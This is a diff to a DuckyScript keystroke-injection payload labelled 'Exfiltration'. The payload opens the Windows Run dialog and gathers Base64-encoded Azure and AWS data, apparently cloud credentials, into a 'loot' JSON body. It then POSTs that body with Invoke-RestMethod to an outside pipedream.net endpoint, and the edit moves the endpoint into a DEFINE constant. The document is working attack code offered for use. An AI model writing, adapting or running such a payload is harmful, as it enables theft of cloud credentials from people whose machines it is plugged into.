@@ -6,6 +6,8 @@ REM Version: 1.0
 REM Category: Exfiltration
 DEFAULTDELAY 10
 
+DEFINE #ENDPOINT https://xxxxxxxxxxxxxxxx.m.pipedream.net
+
 DELAY 1000
 REM Open Run dialog
 GUI r
@@ -37,13 +39,13 @@ STRING $aws_encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.Get
 ENTER
 
 REM Got the loot, exfil
-STRING $endpoint = 'https://xxxxxxxxxxxxxxxx.m.pipedream.net'
+STRING $endpoint = ''
 ENTER
 STRING $loot = '{""az"":""' + $az_encoded + '"",""aws"":""' + $aws_encoded + '""}'
 ENTER
 DELAY 500
 REM Send the HTTP request
-STRING $response = Invoke-RestMethod -Uri $endpoint -Method Post -ContentType 'application/json' -Body $loot
+STRING $response = Invoke-RestMethod -Uri #ENDPOINT -Method Post -ContentType 'application/json' -Body $loot
 ENTER
 DELAY 1000
 REM Display the response
